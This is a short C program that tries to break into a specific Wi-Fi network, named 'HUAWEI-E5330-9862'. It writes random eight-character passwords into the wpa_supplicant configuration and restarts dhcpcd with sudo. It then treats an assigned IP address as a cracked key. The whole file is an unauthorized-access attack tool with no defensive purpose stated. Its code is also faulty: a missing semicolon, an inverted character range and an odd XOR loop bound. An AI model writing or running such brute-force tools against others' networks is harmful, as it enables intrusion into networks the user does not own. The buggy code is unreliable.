#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<arpa/inet.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<linux/wireless.h>
int main(void){
	struct ifconf ifc={0};
	struct ifreq *ifr=NULL;
	struct ifreq *item=NULL;
	struct sockaddr *adr=NULL;
	char ip[INET6_ADDRSTRLEN]={0};
	char buf[8192]={0};
	FILE *fp;
	char a1[]="country=US\nctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\nupdate_config=1\n";
	char a[]="network={\n\tssid=\"HUAWEI-E5330-9862\"\n\t";
	char b[]="psk=\"";
	char c[]="\"\n}\n";
	char file[]="/etc/wpa_supplicant/wpa_supplicant.conf";
	int m=122;
	int n=48;
	int z=50;
	char string[8];
	fp=fopen(file,"wb+");
	fseek(fp,0,SEEK_SET);
	fwrite(a1,sizeof a1-1,1,fp);
	for(int i=0;i<10000000^1000000;i++){
		sprintf(&string[0],"%c",m+rand()/(RAND_MAX/(n-m+1)+1));
		sprintf(&string[1],"%c",m+rand()/(RAND_MAX/(n-m+1)+1));
		sprintf(&string[2],"%c",m+rand()/(RAND_MAX/(n-m+1)+1));
		sprintf(&string[3],"%c",m+rand()/(RAND_MAX/(n-m+1)+1));
		sprintf(&string[4],"%c",m+rand()/(RAND_MAX/(n-m+1)+1));
		sprintf(&string[5],"%c",m+rand()/(RAND_MAX/(n-m+1)+1));
		sprintf(&string[6],"%c",m+rand()/(RAND_MAX/(n-m+1)+1));
		sprintf(&string[7],"%c",m+rand()/(RAND_MAX/(n-m+1)+1));
		if(string[0]!='@'&&string[0]!=':'&&string[0]!=';'&&string[0]!='<'&&string[0]!='='&&string[0]!='>'&&string[0]!='?'&&string[0]!='['&&string[0]!='\\'&&string[0]!=']'&&string[0]!='^'&&string[0]!='_'&&string[0]!='`'&&string[1]!='@'&&string[1]!=':'&&string[1]!=';'&&string[1]!='<'&&string[1]!='='&&string[1]!='>'&&string[1]!='?'&&string[1]!='['&&string[1]!='\\'&&string[1]!=']'&&string[1]!='^'&&string[1]!='_'&&string[1]!='`'&&string[2]!='@'&&string[2]!=':'&&string[2]!=';'&&string[2]!='<'&&string[2]!='='&&string[2]!='>'&&string[2]!='?'&&string[2]!='['&&string[2]!='\\'&&string[2]!=']'&&string[2]!='^'&&string[2]!='_'&&string[2]!='`'&&string[3]!='@'&&string[3]!=':'&&string[3]!=';'&&string[3]!='<'&&string[3]!='='&&string[3]!='>'&&string[3]!='?'&&string[3]!='['&&string[3]!='\\'&&string[3]!=']'&&string[3]!='^'&&string[3]!='_'&&string[3]!='`'&&string[4]!='@'&&string[4]!=':'&&string[4]!=';'&&string[4]!='<'&&string[4]!='='&&string[4]!='>'&&string[4]!='?'&&string[4]!='['&&string[4]!='\\'&&string[4]!=']'&&string[4]!='^'&&string[4]!='_'&&string[4]!='`'&&string[5]!='@'&&string[5]!=':'&&string[5]!=';'&&string[5]!='<'&&string[5]!='='&&string[5]!='>'&&string[5]!='?'&&string[5]!='['&&string[5]!='\\'&&string[5]!=']'&&string[5]!='^'&&string[5]!='_'&&string[5]!='`'&&string[6]!='@'&&string[6]!=':'&&string[6]!=';'&&string[6]!='<'&&string[6]!='='&&string[6]!='>'&&string[6]!='?'&&string[6]!='['&&string[6]!='\\'&&string[6]!=']'&&string[6]!='^'&&string[6]!='_'&&string[6]!='`'&&string[7]!='@'&&string[7]!=':'&&string[7]!=';'&&string[7]!='<'&&string[7]!='='&&string[7]!='>'&&string[7]!='?'&&string[7]!='['&&string[7]!='\\'&&string[7]!=']'&&string[7]!='^'&&string[7]!='_'&&string[7]!='`'){
			fwrite(a,sizeof a-1,1,fp);
			fwrite(b,sizeof b-1,1,fp);
			fwrite(string,8,1,fp);
			fwrite(c,sizeof c-1,1,fp);
		}
		if(i==z){
			z+=50;
			fseek(fp,83,SEEK_SET);
			int s=socket(AF_INET,SOCK_DGRAM,0);
			ifc.ifc_len=sizeof buf;
			ifc.ifc_buf=buf;
			ioctl(s,SIOCGIFCONF,&ifc);
			ifr=ifc.ifc_req;
			item=&ifr[1];
			ioctl(s,SIOCGIFADDR,item);
			adr=&item->ifr_addr;
			inet_ntop(AF_INET,&((struct sockaddr_in*)adr)->sin_addr,ip,sizeof ip);
			system("sudo systemctl restart dhcpcd");
			system("sleep 20");
			printf("%d\n",z)
			printf("%s\n",ip);
			if(ip[0]=='1'){
				printf("found\n");
				exit(0);
			}
			continue;
		}
	}
	fclose(fp);
	return 0;
}

